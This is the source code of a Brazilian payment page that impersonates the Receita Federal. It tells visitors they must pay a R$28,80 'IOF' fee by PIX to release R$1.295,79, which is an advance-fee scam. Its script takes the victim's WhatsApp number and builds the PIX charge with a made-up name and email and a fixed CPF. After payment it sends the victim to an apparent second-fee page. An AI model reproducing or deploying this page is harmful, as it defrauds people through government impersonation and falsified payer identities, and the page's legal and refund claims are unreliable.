<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento do IOF</title>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ST0NVF735F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ST0NVF735F');
</script>‚Ä®
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '727014296718099');
fbq('track', 'PageView');
</script>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* Estilos personalizados para alinhar ao design original */
    .custom-bg-header {
      background-color: #1E3A8A;
      min-height: 60px; /* Altura m√≠nima para evitar corte */
      display: flex;
      align-items: center;
      justify-content: center;
      position: fixed; /* Fixa a barra no topo */
      top: 0;
      left: 0;
      width: 100%;
      z-index: 1000; /* Garante que fique acima do conte√∫do */
    }
    .custom-bg-button {
      background-color: #1E3A8A;
    }
    .custom-bg-button:hover {
      background-color: #1E40AF;
    }
    .custom-alert {
      background-color: #FEF3C7;
      border: 1px solid #FBBF24;
    }
    .custom-warning {
      background-color: #FEF2F2;
      border-left: 4px solid #DC2626;
    }
    .custom-section {
      background-color: #F3F4F6;
    }
    .custom-icon-green {
      background-color: #22C55E;
    }
    .custom-icon-emerald {
      background-color: #10B981;
    }
    body {
      font-family: 'Inter', sans-serif;
      margin: 0; /* Remover margens padr√£o do body */
    }
    .title {
      font-size: 20px; /* Ajuste para 20px */
    }
    .description {
      font-size: 16px; /* Ajuste para 16px */
    }
    .summary h2,
    .section h3,
    .faq h2 {
      font-size: 14px; /* Ajuste para 14px (semibold) */
      font-weight: 600; /* Semibold */
    }
    .summary .total {
      font-size: 18px; /* Ajuste para 18px */
    }
    .button {
      font-size: 16px; /* Ajuste para 16px */
    }
    .faq p {
      font-size: 14px; /* Ajuste para 14px */
      font-weight: 500; /* Medium */
    }
    /* √änfase no input de WhatsApp */
    .whatsapp-section {
      background-color: #A7F3D0; /* Verde mais claro para chamar aten√ß√£o */
      border: 2px solid #D1D5DB; /* Borda mais vis√≠vel */
      border-radius: 8px;
      padding: 1.5rem; /* Aumentado para mais √™nfase */
      margin-bottom: 0.5rem; /* Reduzido para proximidade */
      text-align: center; /* Centraliza o texto */
      display: flex;
      flex-direction: column;
      align-items: center; /* Centraliza verticalmente */
    }
    .whatsapp-label {
      font-size: 18px; /* Aumentado para dar √™nfase */
      font-weight: 600; /* Negrito */
      color: #1E293B; /* Cor mais forte para contraste */
      margin-bottom: 0.25rem; /* Reduzido para compactar */
    }
    /* Ajuste para mobile */
    @media (max-width: 640px) {
      body {
        padding: 1.5rem 1.5rem 0 1.5rem; /* Aumentado padding topo e laterais para mobile, sem padding inferior */
      }
    }
    @media (min-width: 768px) {
      .title { font-size: 24px; }
      .description { font-size: 18px; }
      .summary .total { font-size: 22px; }
      .button { font-size: 18px; }
      .faq h2 { font-size: 16px; }
    }
  </style>
</head>
<body class="bg-[#F9FAFB] font-inter text-gray-900 min-h-screen">
 <script>
  fbq('trackCustom', 'IOF_View', { content_name: 'CheckoutIOF' });
</script>
  <div>
    <!-- Header -->
    <div class="custom-bg-header text-white w-full">
      <img src="receitafederal.png" alt="Receita Federal" class="h-10 max-h-100 mx-auto block" style="max-height: 100%;">
    </div>

    <!-- Alert -->
    <div class="custom-alert flex items-center gap-2 p-2 rounded-lg mb-6 mx-auto max-w-md" style="margin-top: 4rem;">
      <svg class="w-5 h-5 text-yellow-700" fill="currentColor" viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
      </svg>
      <span class="text-yellow-800 text-sm font-medium">Imposto sobre Opera√ß√µes Financeiras (IOF)</span>
    </div>

    <!-- Title and Description -->
    <div class="max-w-md mx-auto">
      <h1 class="title font-bold text-gray-900 mb-6 leading-tight">Pagamento do IOF Obrigat√≥rio para Libera√ß√£o da Cota</h1>
      <p class="description text-gray-600 mb-6 leading-6">Para liberar o valor da cota de R$1.295,79, √© necess√°rio o pagamento do (IOF) no valor de R$28,80.</p>

      <!-- Warning -->
      <div class="custom-warning p-2 mb-6 max-w-md mx-auto">
        <p class="text-red-700 text-sm"><strong>*</strong> Conforme exigido pelo Banco Central do Brasil (Lei n¬∫ 8.894/94), o pagamento do (IOF) √© obrigat√≥rio para a libera√ß√£o do valor. Essa taxa ser√° reembolsada automaticamente junto com o saldo.</p>
      </div>

      <!-- Summary -->
      <div class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto">
        <h2 class="font-semibold mb-2">Resumo</h2>
        <div class="space-y-2">
          <div class="flex justify-between">
            <span class="text-gray-600 text-sm font-medium">Valor ganho</span>
            <span class="font-semibold text-sm">R$1.295,79</span>
          </div>
          <div class="flex justify-between">
            <span class="text-gray-600 text-sm font-medium">Valor a ser pago (IOF)</span>
            <span class="font-semibold text-red-600 text-sm">- R$28,80</span>
          </div>
          <p class="text-xs text-gray-500">*(Reembolsado ap√≥s Aprova√ß√£o da Conta e Libera√ß√£o do Saque)</p>
          <hr class="my-1 border-t border-black">
          <div class="flex justify-between text-lg font-bold">
            <span>Total a receber no PIX</span>
            <span>R$1295,79</span>
          </div>
          <div class="flex items-center gap-2 mt-2">
            <svg class="w-5 h-5 text-white bg-blue-600 rounded-full p-0.5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
            <p class="text-sm text-gray-600">O pagamento de R$1295,79 ser√° processado via PIX imediatamente ap√≥s a confirma√ß√£o.</p>
          </div>
        </div>
      </div>

      <!-- WhatsApp Input and Generate PIX Button -->
      <div class="whatsapp-section mb-6 max-w-md mx-auto">
        <label for="whatsappInput" class="whatsapp-label block mb-0.25">Digite seu WhatsApp para libera√ß√£o</label>
        <input type="tel" id="whatsappInput" placeholder="(DDD) 9XXXX-XXXX" required class="p-2 border border-gray-300 rounded-lg w-full mb-1 focus:outline-none focus:ring-2 focus:ring-[#38C0E5] mx-auto block max-w-xs">
        <p class="whatsapp-error text-red-600 text-sm mb-1 hidden">Por favor, insira um n√∫mero de WhatsApp v√°lido (DDD + 8 ou 9 d√≠gitos).</p>
        <button type="button" id="botaoPagar" class="custom-bg-button text-white font-bold py-2 px-4 rounded-lg w-full max-w-xs mx-auto mb-2 hover:bg-blue-700 focus:outline-2 focus:outline-[#38C0E5] disabled:bg-gray-400 disabled:cursor-not-allowed transition-all duration-200">Gerar Pix Agora</button>
        <div class="trust-badge text-white text-sm flex items-center gap-2 justify-center">
          <svg class="icon w-5 h-5" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
            <g fill="currentColor">
              <path d="M216 56v56c0 96-88 120-88 120s-88-24-88-120V56a8 8 0 0 1 8-8h160a8 8 0 0 1 8 8" opacity=".2"></path>
              <path d="M208 40H48a16 16 0 0 0-16 16v56c0 52.72 25.52 84.67 46.93 102.19c23.06 18.86 46 25.26 47 25.53a8 8 0 0 0 4.2 0c1-.27 23.91-6.67 47-25.53C198.48 196.67 224 164.72 224 112V56a16 16 0 0 0-16-16m0 72c0 37.07-13.66 67.16-40.6 89.42a129.3 129.3 0 0 1-39.4 22.2a128.3 128.3 0 0 1-38.92-21.81C61.82 179.51 48 149.3 48 112V56h160ZM82.34 141.66a8 8 0 0 1 11.32-11.32L112 148.69l50.34-50.35a8 8 0 0 1 11.32 11.32l-56 56a8 8 0 0 1-11.32 0Z"></path>
            </g>
          </svg>
          Transa√ß√£o 100% segura
        </div>
        <p class="payment-status text-white text-base mt-1" id="paymentStatus">Verificando o status do pagamento...</p>
      </div>

      <!-- Pix Generated Container -->
      <div id="pixGeneratedContainer" class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto hidden">
        <h3 class="font-semibold text-base text-[#3DB1A5] mb-2">PIX para Pagamento</h3>
        <p class="text-gray-600 text-sm mb-2">Escaneie o QR Code ou copie o c√≥digo para pagar:</p>
        <img id="pixQrCodeImg" alt="QR Code PIX" class="max-w-xs mx-auto mb-2">
        <textarea id="pixCodeTextarea" readonly class="w-full min-h-[80px] text-center font-mono text-sm p-2 border-dashed border-gray-300 rounded-lg bg-gray-50 cursor-text"></textarea>
        <button onclick="navigator.clipboard.writeText(document.getElementById('pixCodeTextarea').value)" class="custom-bg-button text-white py-2 px-4 rounded-lg mt-2 hover:bg-[#0056B3] transition-colors duration-200">Copiar C√≥digo Pix</button>
        <p class="text-gray-600 text-sm mt-2">Ap√≥s o pagamento, a libera√ß√£o da sua cota ser√° autom√°tica e imediata.</p>
        <p class="payment-status text-base mt-1" id="paymentStatusGenerated">Verificando o status do pagamento...</p>
      </div>

      <!-- Guarantee Section -->
      <div class="custom-section p-2 rounded-lg mb-6 max-w-md mx-auto">
        <div class="flex items-center gap-2 mb-2">
          <svg class="w-5 h-5 text-white custom-icon-green rounded-full p-0.5" fill="currentColor" viewBox="0 0 24 24">
            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
          </svg>
          <h3 class="font-semibold">Garantia de recebimento</h3>
        </div>
        <p class="text-sm text-gray-600">O valor total de R$1295,79 ser√° creditado diretamente no seu PIX ap√≥s o pagamento.</p>
      </div>

      <!-- FAQ -->
      <div class="mb-6 max-w-md mx-auto">
        <h2 class="text-base font-semibold mb-2">D√∫vidas Frequentes</h2>
        <div class="space-y-2">
          <p class="text-sm font-medium border-b border-gray-200 pb-1">Por que o IOF de R$28,80 n√£o √© descontado do saldo acumulado de R$1295,79?</p>
          <p class="text-sm font-medium border-b border-gray-200 pb-1">Como realizar o pagamento do (IOF)?</p>
          <p class="text-sm font-medium border-b border-gray-200 pb-1"><strong>N√ÉO</strong> consigo clicar no bot√£o de "Pagar Imposto"</p>
        </div>
      </div>
    </div>
  </div>
  <script>
    // Fun√ß√µes para dados UTM
    function obterParametrosUTM() {
      const urlAtual = window.location.search;
      const parametros = new URLSearchParams(urlAtual);
      const utms = {};
      const parametrosUTM = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
      parametrosUTM.forEach(param => {
        if (parametros.has(param)) {
          utms[param] = parametros.get(param);
        }
      });
      return utms;
    }

    function adicionarUTMsURL(urlBase, utms) {
      const url = new URL(urlBase);
      const parametros = new URLSearchParams(url.search);
      Object.keys(utms).forEach(key => {
        parametros.set(key, utms[key]);
      });
      url.search = parametros.toString();
      return url.toString();
    }

    // Fun√ß√µes para gerar dados aleat√≥rios
    function generateRandomCpf() {
      return '45604973890';
    }

    function generateRandomEmail() {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let name = '';
      let domain = '';
      for (let i = 0; i < 8; i++) name += chars.charAt(Math.floor(Math.random() * chars.length));
      for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
      return `${name}@${domain}.com`;
    }

    function generateRandomName() {
      const firstNames = ["Jo√£o", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
      const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
      const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
      const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
      return `${randomFirstName} ${randomLastName}`;
    }

    // Fun√ß√£o para validar e formatar o n√∫mero de WhatsApp
    function validateAndFormatPhone(phone) {
      const cleanedPhone = phone.replace(/\D/g, '');
      const phoneRegex = /^([1-9]{2})(9[0-9]{7,8})$/;
      if (!phoneRegex.test(cleanedPhone)) {
        return null;
      }
      return cleanedPhone.substring(0, 12);
    }

    // Configurar o bot√£o e valida√ß√£o do WhatsApp
    document.addEventListener('DOMContentLoaded', function () {
      const botaoPagar = document.getElementById('botaoPagar');
      const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
      const paymentCard = document.querySelector('.whatsapp-section'); // Seletor ajustado para a se√ß√£o do WhatsApp
      const whatsappInput = document.getElementById('whatsappInput');
      const whatsappError = document.querySelector('.whatsapp-error');
      const paymentStatus = document.getElementById('paymentStatus');
      const paymentStatusGenerated = document.getElementById('paymentStatusGenerated');

      const valorIOFcentavos = 2880; // Atualizado para R$28,80
      const redirectUrl = 'https://reativasaldo.net/pagamentoiof2'; // URL para redirecionamento ap√≥s aprova√ß√£o

      function validateWhatsAppInput() {
        const phoneValue = whatsappInput.value.trim();
        const formattedPhone = validateAndFormatPhone(phoneValue);
        if (formattedPhone) {
          whatsappError.classList.add('hidden');
          botaoPagar.disabled = false;
          return formattedPhone;
        } else {
          whatsappError.classList.remove('hidden');
          botaoPagar.disabled = true;
          return null;
        }
      }

      whatsappInput.addEventListener('input', () => {
        validateWhatsAppInput();
      });

      // Fun√ß√£o para verificar o status do pagamento
      async function checkPaymentStatus(transactionId, statusElement) {
        try {
          const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
            method: 'GET',
            headers: {
              'Content-Type': 'application/json'
            }
          });
          const data = await response.json();

          if (response.ok && data.status) {
            statusElement.style.display = 'block';
            if (data.status === 'APPROVED') {
              statusElement.textContent = 'Pagamento aprovado! Redirecionando...';
              statusElement.classList.add('text-green-600');
              setTimeout(() => {
                window.location.href = redirectUrl;
              }, 2000); // Redireciona ap√≥s 2 segundos
              return true;
            } else if (data.status === 'PENDING') {
              statusElement.textContent = 'Aguardando confirma√ß√£o do pagamento...';
            } else {
              statusElement.textContent = 'Pagamento n√£o aprovado. Tente novamente.';
              statusElement.classList.remove('text-green-600');
            }
          } else {
            console.error('Erro ao verificar status do pagamento:', data);
            statusElement.textContent = 'Erro ao verificar pagamento. Tente novamente.';
            statusElement.classList.remove('text-green-600');
          }
          return false;
        } catch (error) {
          console.error('Erro na requisi√ß√£o de status do pagamento:', error);
          statusElement.textContent = 'Erro ao verificar pagamento. Verifique sua conex√£o.';
          statusElement.classList.remove('text-green-600');
          return false;
        }
      }

      // Fun√ß√£o para iniciar polling do status do pagamento
      function startPaymentPolling(transactionId, statusElement) {
        const interval = setInterval(async () => {
          const isApproved = await checkPaymentStatus(transactionId, statusElement);
          if (isApproved) {
            clearInterval(interval);
          }
        }, 5000); // Verifica a cada 5 segundos
      }

      botaoPagar.addEventListener('click', async function(event) {
        event.preventDefault();
        const formattedPhone = validateWhatsAppInput();
        if (!formattedPhone) {
          return;
        }

        const fixedCpf = generateRandomCpf();
        const randomName = generateRandomName();
        const randomEmail = generateRandomEmail();

        botaoPagar.textContent = 'Gerando PIX...';
        botaoPagar.disabled = true;

        const requestBody = {
          name: randomName,
          email: randomEmail,
          cpf: fixedCpf,
          phone: formattedPhone,
          amount: valorIOFcentavos,
          items: [
            {
              unitPrice: valorIOFcentavos,
              title: "Taxa de IOF - Reativa Saldo",
              quantity: 1,
              tangible: false
            }
          ]
        };

        try {
          console.log("üü¢ Enviando dados para o backend:", {
            name: randomName,
            email: randomEmail,
            cpf: fixedCpf,
            phone: formattedPhone,
            amount: valorIOFcentavos,
            items: requestBody.items
          });

          const response = await fetch('/pagamentoiof/api/gerar-pix', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestBody)
          });

          const data = await response.json();

          if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
            paymentCard.style.display = 'none';
            pixGeneratedContainer.style.display = 'block';
            const pixQrCodeImg = document.getElementById('pixQrCodeImg');
            const pixCodeTextarea = document.getElementById('pixCodeTextarea');
            pixQrCodeImg.src = data.pixQrCode;
            pixCodeTextarea.value = data.pixCode;
            // Inicia o polling para verificar o status do pagamento
            startPaymentPolling(data.transactionId, paymentStatusGenerated);
          } else {
            console.error('Erro retornado pelo backend ao gerar PIX:', data);
            alert('Erro ao gerar PIX: ' + (data.message || 'Erro desconhecido. Por favor, tente novamente.'));
            botaoPagar.textContent = 'Gerar Pix Agora';
            botaoPagar.disabled = false;
          }
        } catch (error) {
          console.error('Erro na requisi√ß√£o PIX (erro de rede ou processamento do frontend):', error);
          alert('Ocorreu um erro ao tentar gerar o PIX. Verifique sua conex√£o e tente novamente mais tarde.');
          botaoPagar.textContent = 'Gerar Pix Agora';
          botaoPagar.disabled = false;
        }
      });
    });
  </script>
</body>
</html>
